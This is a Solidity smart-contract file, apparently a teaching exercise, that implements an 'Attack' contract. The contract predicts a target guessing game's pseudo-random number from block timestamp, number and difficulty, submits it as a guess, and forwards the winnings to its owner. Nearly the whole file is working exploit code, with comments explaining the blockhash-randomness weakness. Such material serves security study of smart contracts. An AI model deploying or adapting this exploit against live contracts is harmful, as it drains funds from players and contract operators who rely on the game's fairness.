/**
 * @title Attack (A Contract Exploiting Blockhash Vulnerability)
 * @notice This contract is designed to exploit the blockhash vulnerability present in the 'Random Vulnerabilities Guessing' contract by predicting the pseudo-random numbers generated.
 * @dev The contract utilizes the known block variables (timestamp, block number, block difficulty) to generate the predictable pseudo-random number.
 *
 * Objectives:
 * (a) Interface declaration for the 'Random Vulnerabilities Guessing' contract.
 * (b) Declaration of the main contract 'Attack'.
 * (c) Initializations within the constructor: the address of 'Random Vulnerabilities Guessing' contract and owner of 'Attack'.
 * (d) Define a function 'playtoWin' which is an exploit for the vulnerability present in 'Random Vulnerabilities Guessing' contract.
 * (e) Implement a fallback function to forward any received funds to the contract's owner.
 *
 * Solution:
 * Our aim is to make a correct guess on 'Random Vulnerabilities Guessing' contract by mimicking its randomness generation process. 
 * We achieve this by utilizing the same hash function to generate a pseudo-random number from the block.timestamp, block.number, and block.difficulty. 
 * Then, we pass this number to the 'Random Vulnerabilities Guessing' contract. 
 * If our guess matches with the number it has generated, we win and transfer the prize to the owner of this contract.
 *
 * Explanation:
 * This exploit exists because 'Random Vulnerabilities Guessing' contract uses block variables to generate pseudo-random numbers which are known and predictable before a block is mined. 
 * Therefore, a miner or any entity aware of this method can generate the same number and win the game.
 */
 
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.13;

/**
 * @title Random Vulnerabilities Guessing
 * @dev Interface for the 'Random Vulnerabilities Guessing' contract which contains a 'play' function that accepts a pseudo-random number as a guess.
 */
interface RandomVulnerabilitiesGuessing {
    function play(uint guess) external;
}

/**
 * @title Attack
 * @dev Contract designed to exploit the blockhash vulnerability of 'Random Vulnerabilities Guessing' contract.
 * @custom:objective This contract serves as the main attack vector for exploiting the pseudo-randomness vulnerability in 'Random Vulnerabilities Guessing' contract.
 */
contract Attack {

    // @dev Reference to the 'Random Vulnerabilities Guessing' contract.
    RandomVulnerabilitiesGuessing game;

    // @dev Address of the contract's owner.
    address owner;

    /**
     * @notice Constructor initializes the contract.
     * @dev Constructor sets the address of the 'Random Vulnerabilities Guessing' contract and the owner of 'Attack' contract.
     * @param _gameAddy The address of the 'Random Vulnerabilities Guessing' contract.
     * @custom:objective Objective (b) and (c) completed here. Initialize 'game' with provided contract address and 'owner' with the contract deployer address.
     */
    constructor(address _gameAddy) {
        game = RandomVulnerabilitiesGuessing(_gameAddy);
        owner = msg.sender;
    }

    /**
     * @notice This function generates a pseudo-random number and plays the game using this number.
     * @dev Makes a guess in 'Random Vulnerabilities Guessing' contract using predictable pseudo-random number generated from block variables.
     * @custom:objective Objective (d) is accomplished here. Successfully exploits the randomness vulnerability of 'Random Vulnerabilities Guessing' contract.
     */
    function playtoWin() external {
        uint number = uint(keccak256(abi.encodePacked(block.timestamp, block.number, block.difficulty)));
        game.play(number);
    }

    /**
     * @notice Fallback function to forward any Ether received by the contract to the contract's owner.
     * @dev Upon receiving Ether, it's immediately forwarded to the owner's address.
     * @custom:objective Objective (e) is fulfilled here. Redirects any won amount from 'Random Vulnerabilities Guessing' contract to the owner of 'Attack'.
     */
    receive () external payable {
        // Forward all funds to the owner.
        (bool sent, ) = owner.call{value: address(this).balance}("");
        require(sent, "Failed to send Ether");
    }
}